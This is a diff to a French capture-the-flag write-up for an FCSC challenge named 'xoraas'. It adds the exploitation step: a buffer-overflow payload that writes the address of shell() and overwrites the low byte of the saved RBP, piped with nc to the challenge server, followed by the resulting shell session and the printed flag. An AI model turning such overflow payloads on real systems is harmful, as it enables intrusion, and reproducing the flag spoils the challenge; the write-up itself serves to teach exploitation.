@@ -363,6 +363,19 @@ Si on écrase le LSB du saved RBP avec 0x00 on aura :  0x7fffffffdf00 -> 0x42424
 
 ### Exploitation
 
-L'idée est donc d'avoir un payload de la forme
+Dans le premier buffer on écrit l'adresse de `shell()`
+Dans le deuxième des 0x00 pour que le xor ne change rien
+Et pour écraser le LSB du saved RBP.
 
-('NOP + shellcode') ^ 'z' + 'z' * 140 + 'A' * 4 + '0x00'
+
+```#!/usr/bin/env bash
+(python3 -c "print('\x42\x11\x40\x00\x00\x00\x00\x00' * 16 + '\x00' * 145)";cat ;) | nc challenges.france-cybersecurity-challenge.fr 2053
+id
+uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
+ls
+flag.txt
+xoraas
+cat flag.txt
+FCSC{0d6c81576d1465a876422910769e79af287c9e73254112572737383039194f5d}
+
+```
